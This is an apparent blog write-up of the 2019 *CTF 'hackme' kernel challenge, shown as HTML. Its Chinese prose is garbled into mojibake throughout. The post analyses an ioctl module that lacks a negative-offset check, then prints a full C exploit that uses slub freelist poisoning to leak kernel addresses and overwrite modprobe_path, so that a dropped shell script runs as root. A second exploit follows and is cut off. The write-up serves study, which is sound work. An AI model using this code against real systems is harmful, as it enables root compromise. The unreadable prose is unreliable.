      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/12effc43.html" class="post-title-link" itemprop="url">å…³äº kernel-RW Any Memory çš„å­¦ä¹ æ€»ç»“</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 07:36:47 / ä¿®æ”¹æ—¶é—´ï¼š08:59:56" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>é€šè¿‡æœ¬é¢˜çš„å­¦ä¹ ï¼Œäº†è§£åˆ°äº†åœ¨å†…æ ¸çš„å†…å­˜å…·æœ‰ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›åï¼Œå¯ä»¥åˆ©ç”¨çš„æ‰‹æ³•ã€‚</p>
<h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><code>modprobe</code> æ˜¯ä¸€ä¸ª <code>Linux</code> ç¨‹åºï¼Œç”¨äºåœ¨ <code>Linux</code> å†…æ ¸ä¸­æ·»åŠ æˆ–ç§»é™¤ä¸€ä¸ªå¯åŠ è½½å†…æ ¸æ¨¡å—ï¼Œè¯¥ç¨‹åºçš„è·¯å¾„æ˜¯å†…æ ¸å…¨å±€å˜é‡ï¼Œé»˜è®¤ä¸º <code>/sbin/modprobe</code>ï¼Œå­˜åœ¨åœ¨å†…æ ¸ç¬¦å· <code>modprobe_path</code> ä¸‹ï¼ˆæ­¤å¤„å†…å­˜æœ‰å¯å†™æƒé™ï¼‰ã€‚</p>
<p>å½“æ‰§è¡Œçš„æ–‡ä»¶ç±»å‹ä¸ºç³»ç»ŸæœªçŸ¥çš„ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯æœªçŸ¥çš„æ–‡ä»¶é­”æœ¯å¤´ï¼‰ï¼Œå°†é€šè¿‡ <code>modprobe_path</code> æ¥æ‰§è¡Œ <code>modprobe</code> ç¨‹åºã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>modprobe_path</code> ä¸­å­˜å‚¨çš„è·¯å¾„å¹¶ä¸ä¼šè¢«åˆ¤æ–­æ˜¯å¦æ­£å¸¸ï¼Œæ— è®ºè·¯å¾„æŒ‡å‘çš„æ˜¯å“ªä¸ªæ–‡ä»¶ï¼Œéƒ½ä¼šå°†å…¶æ‰§è¡Œï¼Œå› ä¸ºç³»ç»Ÿä»ç„¶å¤„äºå†…æ ¸æ¨¡å¼ï¼Œæ‰€ä»¥æ˜¯ä»¥ <code>root</code> æƒé™æ‰§è¡Œçš„ç›®æ ‡æ–‡ä»¶ï¼Œå¦‚æœç›®æ ‡æ–‡ä»¶æ˜¯æˆ‘ä»¬ç¼–å†™çš„ <code>shell</code> è„šæœ¬ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæˆ‘ä»¬å…·æœ‰äº† <code>root</code> æƒé™ä¸‹çš„ä»»æ„æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚</p>
<p>å› æ­¤å¦‚æœæœ‰ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›ï¼Œå¯ä»¥è€ƒè™‘è¦†ç›– <code>modprobe_path</code> ï¼Œå®ƒæ¯”èµ·è°ƒç”¨<code>commit_creds(prepare_kernel_cred(0))</code> æ›´æ–¹ä¾¿ã€‚</p>
<p>é¢˜ç›®æ˜¯ 2019STARCTF hackeme é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme">https://github.com/cc-sir/ctf-challenge/tree/master/2019%20STARCTF%20hackme</a></p>
<h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p>é€šè¿‡ä¸‹é¢çš„ <code>_kmalloc</code> å‡½æ•°ï¼Œå¯ä»¥åˆ†æå‡ºæ¥ <code>v19</code> æ˜¯ <code>size</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102012069.png" alt="image-20230410201237881"></p>
<p>è€Œç¨‹åºæœ€å¼€å§‹æœ‰ä¸€ä¸ª <code>copy_from_user</code> å‡½æ•°ï¼Œ <code>copy</code> äº† <code>32</code> ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œæ­£å¥½æ˜¯å¯ä»¥æ§åˆ¶ä» <code>v17</code> å¼€å§‹åˆ° <code>v20</code> ï¼Œè€ƒè™‘åˆ°ä¸Šé¢ <code>v19</code> æ˜¯ä¸ª <code>size</code> ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™å››ä¸ªå˜é‡éƒ½æ˜¯ä¸€ä¸ªç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102014305.png" alt="image-20230410201412269"></p>
<p>é€šè¿‡è¿™ä¸‰è¡Œä»£ç ï¼Œå¯ä»¥çŒœæµ‹å‡ºæ¥ <code>v17</code> æ˜¯ä¸€ä¸ª <code>index</code> ï¼Œå…¶å†³å®šäº†ç”³è¯·å‡ºæ¥å †å—çš„åœ°å€æ”¾åˆ° <code>pool</code> æ•°ç»„çš„å“ªä¸ªä½ç½®ï¼ˆ <code>pool</code> æ•°ç»„å°±æ˜¯æ¥å­˜æ”¾ç”³è¯·çš„å †å—åœ°å€çš„ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102033502.png" alt="image-20230410203337467"></p>
<p>è¿™é‡Œå°† <code>v18</code> ä¸­çš„æ•°æ® <code>copy</code> åˆ°äº†åˆšåˆšç”³è¯·çš„å †å—ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ¤æ–­ <code>v18</code> æ˜¯ <code>data_ptr</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102117851.png" alt="image-20230410211733810"></p>
<p>ç¨‹åºä¸­çš„ <code>v20</code> ï¼Œåˆšå¼€å§‹çœ‹æ„Ÿè§‰å¾ˆå¥‡æ€ªï¼Œå…·ä½“å•¥ä½œç”¨ä¹Ÿè¯´ä¸ä¸Šæ¥ï¼Œå› ä¸º <code>v4</code> å·²ç»æ˜¯å †åœ°å€äº†ï¼Œæ‰€ä»¥åŠ ä¸Šçš„ <code>v20</code> æˆ‘ä»¬å§‘ä¸”ç§°ä¹‹ä¸º <code>offset</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102122263.png" alt="image-20230410212250229"></p>
<p>å››ä¸ªå˜é‡åå­—ç¡®å®šä¹‹åï¼Œå¼€å§‹åˆ†æç¨‹åº</p>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102154053.png" alt="image-20230410215435020"></p>
<p>é¦–å…ˆæ˜¯ <code>delete</code> éƒ¨åˆ†ï¼ˆå¦‚ä¸Šï¼‰ï¼Œå‘ç°è¿™ä¸ª <code>kfree()</code> å¾ˆå¥‡æ€ªï¼Œå› ä¸º <code>IDA</code> ç”Ÿæˆçš„ä¼ªä»£ç çœ‹ä¸åˆ°å‚æ•°ï¼Œæº¯æºä¸€ä¸‹æ±‡ç¼–å‘ç° <code>kfree</code> çš„å‚æ•°å…¶å®å°±æ˜¯ <code>v14</code> ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102151664.png" alt="image-20230410215111627"></p>
<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>è¿™ä¸ª <code>add</code> éƒ¨åˆ†å¯ä»¥å‘ç° <code>v12[0]</code> å­˜æ”¾çš„æ˜¯ç”³è¯·çš„ <code>chunk_addr</code> ï¼Œ<code>v12[1]</code> å­˜æ”¾çš„æ˜¯ <code>size</code> ï¼Œè€Œ <code>v12</code> æœ¬èº«å°±æ˜¯ <code>pool[2*index]</code> æ•°ç»„çš„åœ°å€ï¼Œå› æ­¤ <code>chunk_addr</code> å’Œ <code>size</code> éƒ½è®°å½•åœ¨äº† <code>pool</code> æ•°ç»„ä¸­ã€‚é€šè¿‡ <code>copy_from_user</code> å‡½æ•°å‘å †å—ä¸­å†™å…¥æ•°æ®ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102156379.png" alt="image-20230410215619344"></p>
<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102220490.png" alt="image-20230410222056453"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œ <code>v5[1]</code> æ˜¯ <code>idx</code> å¯¹åº”å †å—çš„ <code>size</code> ï¼Œè¿™é‡Œçš„ <code>offset+size</code> åªåˆ¤æ–­äº†æ˜¯å¦å°äº <code>v5[1]</code> ï¼Œä½†æ˜¯å¿˜è®°åˆ¤æ–­äº† <code>offset+size</code> è¦å¤§äº <code>0</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„ <code>offset</code> å¯ä»¥ä¸ºè´Ÿå€¼ï¼Œå¦‚æœ <code>offset</code> ä¸ºè´Ÿæ•°çš„è¯ï¼Œå°±å¯¼è‡´äº† <code>offset+chunk_addr</code> æ‹·è´çš„å¹¶ä¸æ˜¯å½“å‰æŒ‡å®šçš„å †å—ä¸­æ•°æ®ï¼Œå¯èƒ½æ˜¯ä¸Šä¸€ä¸ªå †å—ï¼ˆä½åœ°å€å¤„ï¼‰çš„æ•°æ®ï¼Œåœ¨è¿™ä¸ª <code>show</code> éƒ¨åˆ†ç›¸å½“äºä»»æ„åœ°å€è¯»</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304102228740.png" alt="image-20230410222823697"></p>
<p>å’Œä¸Šé¢ <code>show</code> éƒ¨åˆ†çš„æ¼æ´ä¸€æ ·ï¼Œ <code>offset</code> å€¼å¯ä»¥ä¸ºè´Ÿï¼Œä»è€Œå¯ä»¥ä»»æ„åœ°å€å†™ã€‚</p>
<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p><code>slub</code> åˆ†é…å™¨æ˜¯ <code>Linux</code> å†…æ ¸ä¸­çš„ä¸€ç§å†…å­˜åˆ†é…å™¨,å…¶åˆ†é…åŸç†å’Œ <code>fastbin</code> åŸç†ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œåˆ†é…çš„å †å—æ²¡æœ‰å †å—å¤´ï¼Œä¹Ÿå°±æ˜¯ä¸åŠ  <code>0x10</code> ï¼Œç”³è¯·å¤šå°‘å°±æ˜¯å¤šå°‘ã€‚</p>
<p>åˆ©ç”¨æ€è·¯å°±æ˜¯ç±»ä¼¼äº <code>fastbin attack</code> çš„æ‰‹æ³•ï¼Œæ•°ç»„ç´¢å¼•å‘ä¸Šï¼ˆä½åœ°å€ï¼‰æº¢å‡ºï¼Œè¦†ç›– <code>fd</code> æŒ‡é’ˆï¼Œä»è€Œå®ç°ä»»æ„åœ°å€ç”³è¯·å’Œæ³„éœ²ã€‚é¦–å…ˆå»æ³„éœ²å‡ºå†…æ ¸åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Š <code>mod_tree</code> åœ¨å†…æ ¸ä¸­çš„åç§»ï¼ˆ <code>mod_tree</code> åœ¨å†…æ ¸ä¸­ï¼Œè€Œé‡Œé¢æœ‰æ¨¡å—çš„æŒ‡é’ˆï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬ç”¨å®ƒæ¥æ³„éœ²å‡ºæ¨¡å—çš„åŸºåœ°å€ï¼‰å¾—åˆ° <code>mod_tree</code> åœ°å€ï¼Œå°†å…¶ç”³è¯·å‡ºæ¥ï¼Œæ³„éœ²å‡ºæ¨¡å—çš„åŸºåœ°å€ã€‚æœ‰äº†æ¨¡å—çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°† <code>pool</code> æ•°ç»„ç”³è¯·å‡ºæ¥å†™å…¥ <code>modprobe_path</code> æŒ‡é’ˆï¼ˆè¯¥æŒ‡é’ˆåœ¨å†…æ ¸ä¸­ï¼‰ï¼Œç”¨ <code>edit</code> åŠŸèƒ½å®ç°ä»»æ„åœ°å€å†™ï¼ˆæˆ‘çŒœæµ‹æ— æ³•ç›´æ¥å°† <code>fd</code> æŒ‡é’ˆæ§åˆ¶ä¸º <code>modprobe_path</code> ç”³è¯·å‡ºæ¥ç„¶åå†™å…¥æ•°æ®çš„åŸå› æ˜¯è¿™æ ·ä¼šç ´ååŸæœ¬å†…æ ¸ä¸­çš„å †ç»“æ„ï¼Œå¦‚æœåˆ©ç”¨ <code>pool</code> æ•°ç»„ä»»æ„å†™çš„è¯ï¼Œå¯ä»¥å°†ä¹‹å‰çš„å †ç»“æ„å†æ¢å¤ï¼‰</p>
<p>ä¸Šé¢çš„è¿‡ç¨‹å’Œåš <code>glibc</code> å †é¢˜çš„æ€æƒ³åŸºæœ¬ä¸€è‡´ï¼Œå…·ä½“è¿‡ç¨‹å°±ä¸å†èµ˜è¿°ã€‚</p>
<p>ä½†æˆ‘ä¸€ç›´ä¸æ˜ç™½ä¸ºä»€ä¹ˆæˆ‘çš„è„šæœ¬ä¼šå¯¼è‡´å†…æ ¸å´©æºƒï¼Œå°±æ˜¯æ‰§è¡Œå®Œç¯¡æ”¹ <code>modprobe_path</code> éƒ½æ²¡æœ‰å´©æºƒï¼Œå¯ä»¥çœ‹åˆ°ä¸‹å›¾æ˜¯æ”¹å†™æˆåŠŸçš„</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172038840.png" alt="image-20230417202505374"></p>
<p>æ­¤æ—¶ä¹Ÿæ²¡æœ‰å´©æºƒï¼Œä½†æ˜¯å†è¿”å›åˆ°ç”¨æˆ·æ€è°ƒç”¨å‡½æ•°æˆ–è€…å†è¿è¡Œä¸€æ¬¡è„šæœ¬ï¼Œå†…æ ¸å°±ä¼šå´©æºƒé‡å¯ã€‚</p>
<p>å¯èƒ½æ˜¯æˆ‘ç ´åäº†æŸäº›å †ç»“æ„ï¼Ÿå¯æ˜¯æˆ‘å°†ä¹‹å‰å…¨éƒ¨ç ´åçš„æŒ‡é’ˆåˆç”¨ä»»æ„åœ°å€å†™æ¢å¤äº†ï¼Œemmm å› ä¸ºæ˜¯å®Œå…¨è‡ªå·±å†™çš„ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯æŸä¸ªå¥‡å¥‡æ€ªæ€ªçš„åœ°æ–¹æåäº†ï¼Œä¸è¿‡æœ€ç»ˆæ€æƒ³æ˜¯æ²¡é—®é¢˜çš„ï¼Œå› ä¸ºç¡®å®æ˜¯æˆåŠŸæ”¹æ‰äº†è·¯å¾„ã€‚</p>
<p>ä¸‹é¢æ”¾ä¸€ä¸‹æˆ‘è¿™ä¸ªä¼šå´©æºƒçš„ <code>EXP</code> â€¦ ä¹Ÿç®—è®°å½•ä¸€ä¸‹</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> *user_ptr;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=<span class="number">0</span>;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    data.user_ptr=<span class="literal">NULL</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> *mem=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    add(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x1e0</span>);</span><br><span class="line">    write(<span class="number">1</span>,mem,<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_address = *((<span class="type">size_t</span> *)mem);  </span><br><span class="line">    <span class="type">size_t</span> leak_heap = *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak kernel address %llx\n&quot;</span>,kernel_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base=kernel_address<span class="number">-0x847240</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base %llx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="type">size_t</span> mod_tree=kernel_base+<span class="number">0x811000</span>+<span class="number">0x100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mod tree %llx\n&quot;</span>,mod_tree);</span><br><span class="line">    add(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    delete(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//attack</span></span><br><span class="line">    edit(fd,<span class="number">1</span>,&amp;mod_tree,<span class="number">0x200</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">3</span>,mem,<span class="number">0x110</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> hackme_base = *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))<span class="number">-0x2320</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hackme_base %llx\n&quot;</span>,hackme_base); </span><br><span class="line">    <span class="type">size_t</span> pool=hackme_base+<span class="number">0x2400</span>+<span class="number">0xc0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pool address %llx\n&quot;</span>,pool);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">4</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    add(fd,<span class="number">5</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    delete(fd,<span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> modprobe_math=kernel_base+<span class="number">0x83f960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_math %llx\n&quot;</span>,modprobe_math);</span><br><span class="line">    edit(fd,<span class="number">5</span>,&amp;pool,<span class="number">0x240</span>,<span class="number">-0x200</span>);</span><br><span class="line">    add(fd,<span class="number">6</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">int</span> fake_size=<span class="number">0x200</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)mem)=modprobe_math;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x10</span>))=leak_heap+<span class="number">0x1b0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x18</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>))=leak_heap+<span class="number">0xe02bfb0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x28</span>))=fake_size;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">7</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">char</span> *str=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> data1=leak_heap+<span class="number">0x3b0</span>;</span><br><span class="line">    <span class="type">size_t</span> data2=leak_heap+<span class="number">0xe02c3b0</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(str,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line">    edit(fd,<span class="number">0xc</span>,str,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xd</span>,&amp;data1,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xe</span>,&amp;data2,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/sir&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;/home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ä¸‹é¢æ˜¯ <a target="_blank" rel="noopener" href="http://p4nda.top/">P4nda</a> å¸ˆå‚…çš„è„šæœ¬ï¼Œæˆ‘å’Œä»–çš„æ€è·¯å·®ä¸å¤š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC 0x30000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x30001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE 0x30002</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">size_t</span> idx;</span><br><span class="line">	<span class="type">void</span> *addr;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> len;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span 